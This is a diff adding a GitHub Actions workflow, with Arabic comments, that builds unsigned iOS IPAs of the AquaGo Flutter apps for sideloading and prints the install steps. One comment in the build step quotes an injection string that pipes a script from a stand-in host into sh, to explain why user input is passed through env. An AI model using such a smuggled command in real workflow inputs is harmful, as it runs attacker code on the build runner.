@@ -1,0 +1,202 @@
+# ==========================================================================
+# AquaGo — بناء iOS بلا توقيع (مسار Sideload)
+#
+# هذا المسار لمن ما عنده اشتراك مطوّر مدفوع: يبني .app غير موقّع، ويحزّمه
+# IPA يدويًا، وأنت توقّعه على جهازك بـSideloadly بـApple ID مجاني.
+# حدّان لا مفرّ منهما وهما مذكوران بالتفصيل في خلاصة التشغيل:
+#   ٧ أيام وتنتهي الشهادة المجانية، والإشعارات لا تعمل إطلاقًا.
+#
+# لو بدّك نسخة تعيش سنة وتوصلها إشعارات — هذا يحتاج التوقيع الحقيقي:
+#   .github/workflows/ios-release.yml     (البناء الموقّع والرفع لـTestFlight)
+#   tools/ios-signing-secrets.sh          (يفحص الشهادات ويولّد الأسرار)
+#   ios_signing/README.md                 (شرح الملفات والخطوات عند آبل)
+# ==========================================================================
+
+name: iOS — بناء بلا توقيع (Sideload)
+
+# يدويًا فقط. رانر macOS يُحاسَب بعشرة أضعاف رانر Linux على GitHub، فتشغيله
+# على كل push يحرق الحصة خلال أيام على مشروع بحجم هذا.
+on:
+  workflow_dispatch:
+    inputs:
+      app:
+        description: "التطبيق المطلوب بناؤه"
+        type: choice
+        required: true
+        default: both
+        options:
+          - customer_app
+          - driver_app
+          - both
+      api_url:
+        description: "عنوان الخادم (اتركه فارغًا = خادم الإنتاج المضبوط داخل التطبيق)"
+        type: string
+        required: false
+        default: ""
+
+jobs:
+  # وظيفة رخيصة على ubuntu تترجم الاختيار إلى مصفوفة JSON. تشغيل هذا على
+  # macOS هدر: ثوانٍ من رانر غالٍ مقابل سطر jq واحد.
+  choose:
+    name: تحديد التطبيقات
+    runs-on: ubuntu-latest
+    outputs:
+      apps: ${{ steps.pick.outputs.apps }}
+    steps:
+      - id: pick
+        env:
+          # قيمة من مدخلات المستخدم — تُمرَّر بـenv لا داخل نص الأمر.
+          APP_INPUT: ${{ inputs.app }}
+        run: |
+          set -euo pipefail
+          if [ "$APP_INPUT" = "both" ]; then
+            APPS='["customer_app","driver_app"]'
+          else
+            APPS="$(printf '%s' "$APP_INPUT" | jq -R -c '[.]')"
+          fi
+          echo "apps=$APPS" >> "$GITHUB_OUTPUT"
+          echo "سيُبنى: $APPS"
+
+  build:
+    name: بناء ${{ matrix.app }}
+    needs: choose
+    runs-on: macos-latest
+    timeout-minutes: 45
+    strategy:
+      # فشل تطبيق لا يلغي الثاني. بدونها يقتل GitHub بقية المصفوفة عند أول
+      # فشل، فتخسر بناءً سليمًا بسبب عطل في تطبيق آخر لا علاقة له به.
+      fail-fast: false
+      matrix:
+        app: ${{ fromJson(needs.choose.outputs.apps) }}
+
+    steps:
+      - name: سحب المستودع
+        uses: actions/checkout@v4
+
+      - name: تثبيت Flutter
+        uses: subosito/flutter-action@v2
+        with:
+          # نسخة مثبّتة حرفيًا لا "stable" — النسخة المتحرّكة تعني أن بناءً
+          # نجح اليوم قد يفشل غدًا بلا أي تغيير في الكود. هذه هي النسخة
+          # المستعملة في التطوير (flutter --version) وpubspec يطلب Dart ^3.11.4.
+          flutter-version: 3.41.6
+          channel: stable
+          cache: true
+
+      - name: تخزين CocoaPods مؤقتًا
+        uses: actions/cache@v4
+        with:
+          path: |
+            ${{ matrix.app }}/ios/Pods
+            ~/Library/Caches/CocoaPods
+          # المفتاح من hash الـpubspec: أي تغيير في الاعتماديات يغيّر
+          # Podfile.lock المولَّد، فلا يصحّ إعادة استعمال Pods قديمة معه.
+          key: pods-${{ runner.os }}-${{ matrix.app }}-${{ hashFiles(format('{0}/pubspec.yaml', matrix.app)) }}
+          restore-keys: |
+            pods-${{ runner.os }}-${{ matrix.app }}-
+
+      - name: جلب الاعتماديات
+        working-directory: ${{ matrix.app }}
+        run: flutter pub get
+
+      - name: البناء بلا توقيع
+        working-directory: ${{ matrix.app }}
+        env:
+          # نصٌّ يكتبه المستخدم في نافذة التشغيل. تمريره عبر env لا داخل نص
+          # الأمر مقصود: لو وُضع في الأمر مباشرة صار بإمكان من يشغّل الوركفلو
+          # كتابة `x"; curl evil.sh | sh; "` وينفَّذ على الرانر بصلاحياتنا.
+          # داخل env يبقى نصًّا لا يفسّره الـshell.
+          API_URL: ${{ inputs.api_url }}
+        run: |
+          set -euo pipefail
+          ARGS=(build ios --release --no-codesign)
+          if [ -n "$API_URL" ]; then
+            ARGS+=(--dart-define=API_URL="$API_URL")
+            echo "الخادم: $API_URL"
+          else
+            echo "الخادم: الإنتاج (القيمة الافتراضية داخل التطبيق)"
+          fi
+          flutter "${ARGS[@]}"
+
+      - name: تحزيم IPA يدويًا
+        working-directory: ${{ matrix.app }}
+        run: |
+          set -euo pipefail
+          # لا يمكن استعمال `flutter build ipa` هنا: تصديرها يمرّ بـxcodebuild
+          # الذي يطلب هوية توقيع، وهذا كل ما نتجنّبه في هذا المسار. فنبني
+          # الـIPA بأيدينا — وهي في الأصل ملف zip فيه مجلد Payload لا أكثر،
+          # وSideloadly يوقّعها ويعيد تحزيمها عندك.
+          cd build/ios/iphoneos
+          mkdir -p Payload
+          cp -r Runner.app Payload/
+          zip -qr app-unsigned.ipa Payload
+          ls -lh app-unsigned.ipa
+
+      - name: فحص الـentitlements
+        working-directory: ${{ matrix.app }}
+        # لا يوقف البناء: هذه نسخة غير موقّعة أصلًا، والفحص للعلم فقط.
+        continue-on-error: true
+        run: |
+          set -uo pipefail
+          ENT="$(codesign -d --entitlements :- build/ios/iphoneos/Runner.app 2>&1 || true)"
+          {
+            echo "### 🔍 فحص الصلاحيات — ${{ matrix.app }}"
+            echo ""
+            echo '```'
+            echo "$ENT"
+            echo '```'
+            echo ""
+            if printf '%s' "$ENT" | grep -q "aps-environment"; then
+              echo "- \`aps-environment\` موجودة."
+            else
+              # غيابها هنا متوقّع ولا يعني عطلًا: الصلاحية تُحقن وقت التوقيع
+              # من البروفايل، وهذه النسخة بلا توقيع. النتيجة العملية أن
+              # الإشعارات لن تعمل في نسخة الـsideload — وهذا حدّ المسار لا خلل فيه.
+              echo "- ⚠️ \`aps-environment\` غائبة — **متوقّع** في نسخة بلا توقيع."
+              echo "  الصلاحية تأتي من بروفايل التوقيع، ولا بروفايل هنا."
+              echo "  عمليًا: **لا إشعارات** في هذه النسخة. الإشعارات تحتاج"
+              echo "  المسار الموقّع في \`ios-release.yml\` (باشتراك مدفوع)."
+            fi
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      - name: رفع الـIPA
+        uses: actions/upload-artifact@v4
+        with:
+          # الاسم يحمل الكومِت: عند وجود عدة نسخ تعرف أيّها من أي كود بلا تخمين.
+          name: ${{ matrix.app }}-unsigned-${{ github.sha }}
+          path: ${{ matrix.app }}/build/ios/iphoneos/app-unsigned.ipa
+          if-no-files-found: error
+          retention-days: 14
+
+      - name: تعليمات التثبيت
+        if: always()
+        run: |
+          {
+            echo "## 📲 تثبيت ${{ matrix.app }} على الآيفون"
+            echo ""
+            echo "**١. نزّل الملف**"
+            echo "من قسم Artifacts في أعلى صفحة التشغيل، نزّل"
+            echo "\`${{ matrix.app }}-unsigned-${{ github.sha }}\`."
+            echo "ينزل **zip** (GitHub يحزّم كل artifact) — فُكّه أولًا،"
+            echo "بداخله \`app-unsigned.ipa\` وهو الملف المقصود."
+            echo ""
+            echo "**٢. وقّعه بـSideloadly**"
+            echo "افتح Sideloadly على الكمبيوتر، وصّل الآيفون بالكيبل،"
+            echo "اسحب \`app-unsigned.ipa\` إلى النافذة، وسجّل دخولك"
+            echo "بـ**Apple ID مجاني** (لا يحتاج اشتراك مدفوع)، ثم Start."
+            echo ""
+            echo "**٣. وثّق المطوّر من الآيفون**"
+            echo "أول تشغيل سيرفض النظام فتح التطبيق. من الجهاز:"
+            echo "الإعدادات ← عام ← VPN وإدارة الجهاز ← اختر حسابك ← **وثوق**."
+            echo ""
+            echo "### ⚠️ حدّان لا مفرّ منهما في هذا المسار"
+            echo ""
+            echo "- **٧ أيام وتنتهي.** الشهادة المجانية عمرها أسبوع، وبعدها"
+            echo "  يتوقّف التطبيق عن الفتح. الحل: أعد التوقيع بـSideloadly"
+            echo "  كل أسبوع (البيانات لا تُمسح ما دمت لم تحذف التطبيق)."
+            echo "- **الإشعارات لا تعمل.** لا حيلة برمجية فيها: صلاحية"
+            echo "  \`aps-environment\` تحتاج بروفايل من حساب مدفوع."
+            echo ""
+            echo "تريد سنة كاملة وإشعارات تعمل؟ ذلك مسار \`ios-release.yml\`"
+            echo "(TestFlight) وهو يتطلّب اشتراك Apple Developer المدفوع."
+          } >> "$GITHUB_STEP_SUMMARY"
